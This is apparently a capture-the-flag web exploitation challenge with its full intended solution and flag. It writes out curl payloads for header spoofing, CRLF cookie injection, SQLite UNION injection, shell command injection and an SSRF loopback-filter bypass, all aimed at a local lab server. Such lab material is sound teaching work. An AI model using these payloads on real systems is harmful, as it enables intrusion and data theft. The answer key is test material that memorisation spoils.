# The Midnight Gallery

## Author
DeliverHellVeil

## Domain
Web Exploitation

## Difficulty
Medium-Hard

### Question Description

The Midnight Gallery is an underground marketplace for illicit digital artifacts. Its staging gateway is publicly accessible, but the staff portal behind it is restricted. Rumour has it that the gallery is preparing a classified data file known as the **Masterpiece**.

Intelligence indicates that the Masterpiece has been split into four shards distributed across the gallery's internal network, with each shard protected by a different vulnerability.

Your objective is to bypass the staging gateway, recover all four shards, and assemble the final flag.

**Tools required:** A web browser and Burp Suite (recommended) or `curl`.

**Rules:**

- Attack only the challenge server. Do not test other systems.
- Do not attempt denial-of-service attacks. Keep requests reasonable.
- Submit the flag in the format `kernel{...}`.

### Intended Solution

Begin by requesting the dashboard and saving the returned cookies:

```
curl -c jar.txt http://localhost:8080/
```

The server responds with `403 Forbidden`, explaining that the gateway only accepts requests from internal IP addresses.

The gateway relies on the `X-Forwarded-For` header to determine the apparent client IP address. Since this header is controlled by the client, attempt to spoof an internal address:

```
curl -c jar.txt \
  -H "X-Forwarded-For: 127.0.0.1" \
  http://localhost:8080/
```

The dashboard now loads, and the server sets a `gateway_auth` cookie. Save this cookie and include it in subsequent requests using `-b jar.txt`.

The dashboard displays links to Catalog, Archive, Diagnostics, and Preview, along with the internal vault endpoint `/internal/vault`.

This reveals the first vulnerability: the gateway trusts a client-controlled header to make an access-control decision.

**Recover Shard 1 Through Cookie Manipulation:**  
Query artwork record 1 to inspect its metadata:

```
curl -b jar.txt \
  "http://localhost:8080/api/v1/artworks?id=1"
```

The response reveals that the record has `"prev_id": 0`, indicating that record 0 is the genesis record.

Attempt to retrieve it:

```
curl -b jar.txt \
  "http://localhost:8080/api/v1/artworks?id=0"
```

The server responds with an error stating that the genesis record requires the cookie `access_tier=curator`.

There are two intended ways to obtain access.

**Method A: CRLF Injection**

The Archive navigation link uses `/api/v1/redirect?to=...`. The redirect endpoint inserts the supplied value into the HTTP `Location` header without properly sanitizing line breaks.

HTTP headers are separated by CRLF sequences. By injecting `%0d%0a`, you can terminate the existing header and add a new `Set-Cookie` header:

```
curl -i -c jar.txt -b jar.txt \
  "http://localhost:8080/api/v1/redirect?to=home%0d%0aSet-Cookie:%20access_tier%3Dcurator%3B%20Path%3D%2F"
```

The response sets `access_tier=curator`. The cookie jar stores it for subsequent requests.

**Method B: Set the Cookie Directly**

Alternatively, the error message reveals the required cookie name and value. Since the application trusts the client-supplied cookie, provide it directly:

```
curl -b jar.txt \
  -b "access_tier=curator" \
  "http://localhost:8080/api/v1/artworks?id=0"
```

Either method grants access to the genesis record. The response contains:

```
{
  "status": "success",
  "artifact": "Genesis Record",
  "shard": "kernel{1_h1dd3n_",
  "internal_origin": "http://gallery.local:8080"
}
```

Record the first shard and save the internal origin for use in Step 5.

**Shard 1:** `kernel{1_h1dd3n_`

**Recover Shard 2 Through SQL Injection:**  
Navigate to the Archive page. Its artwork search functionality passes user-supplied search text directly into an SQL query, and database errors are exposed in the response.

The page footer identifies the database as SQLite 3. Since the query returns three columns (ID, Title, and Artist), use a `UNION SELECT` statement with three corresponding values.

First, enumerate the database tables using SQLite's `sqlite_master` table:

```
curl -b jar.txt -G \
  "http://localhost:8080/archive.php" \
  --data-urlencode "search=' UNION SELECT 0,name,sql FROM sqlite_master-- "
```

The output reveals a table named `secrets`, with columns `id`, `shard`, and `notes`.

Query the table to retrieve the second shard:

```
curl -b jar.txt -G \
  "http://localhost:8080/archive.php" \
  --data-urlencode "search=' UNION SELECT 0,shard,notes FROM secrets-- "
```

The response exposes the shard in the Title column:

```
2_un10n_
```

**Shard 2:** `2_un10n_`

**Recover Shard 3 Through Command Injection:**  
Navigate to the Diagnostics page, which provides a host-pinging function. The supplied IP address is passed to a shell command without proper sanitization.

A semicolon can terminate the original command and execute another command. Use this behavior to list the files in the diagnostics service's working directory:

```
curl -b jar.txt -X POST \
  --data-urlencode "ip=127.0.0.1; ls" \
  "http://localhost:8080/admin/diagnostics"
```

The output includes `shard3.txt`.

Read the file using another injected command:

```
curl -b jar.txt -X POST \
  --data-urlencode "ip=127.0.0.1; cat shard3.txt" \
  "http://localhost:8080/admin/diagnostics"
```

The output reveals the third shard:

```
3_sh3ll_
```

**Shard 3:** `3_sh3ll_`

The command injection vulnerability provides access to files within the diagnostics service's environment. However, this service does not directly expose the vault, so the final shard requires another technique.

**Recover Shard 4 Through Server-Side Request Forgery (SSRF):**  
The Preview Fetcher downloads a URL supplied by the user. The internal vault at `/internal/vault` returns the final shard when accessed through a request originating from the server itself.

The fetcher blocks loopback addresses, including `127.0.0.1`, `localhost`, `0.0.0.0`, `[::1]`, `127.1`, `2130706433`, and `0x7f000001`.

For example, attempting to access the vault directly through the loopback address fails:

```
curl -b jar.txt -G \
  "http://localhost:8080/api/v1/fetch_preview" \
  --data-urlencode "url=http://127.0.0.1:8080/internal/vault"
```

The response is:

```
{
  "error": "Blocked: internal address detected"
}
```

The filter resolves the hostname supplied in the URL and rejects hosts that resolve to loopback addresses. However, the gateway's own hostname is trusted by the filter.

Recall the `internal_origin` value discovered in Step 2: `http://gallery.local:8080`.

Use this hostname to access the vault through the Preview Fetcher:

```
curl -b jar.txt -G \
  "http://localhost:8080/api/v1/fetch_preview" \
  --data-urlencode "url=http://gallery.local:8080/internal/vault"
```

The fetcher returns the vault's response:

```
{
  "status": 200,
  "url": "http://gallery.local:8080/internal/vault",
  "content": "{\"shard\": \"4_m4st3rp13c3}\"}"
}
```

The final shard is:

```
4_m4st3rp13c3}
```

This demonstrates an SSRF vulnerability: the server fetches a user-controlled URL, and its hostname-based filtering can be bypassed using a trusted internal hostname.

**Shard 4:** `4_m4st3rp13c3}`

Combine the four shards in the order they were recovered:

- Shard 1: `kernel{1_h1dd3n_`
- Shard 2: `2_un10n_`
- Shard 3: `3_sh3ll_`
- Shard 4: `4_m4st3rp13c3}`

Joining the shards produces the complete flag.

### Flag

> `kernel{1_h1dd3n_2_un10n_3_sh3ll_4_m4st3rp13c3}`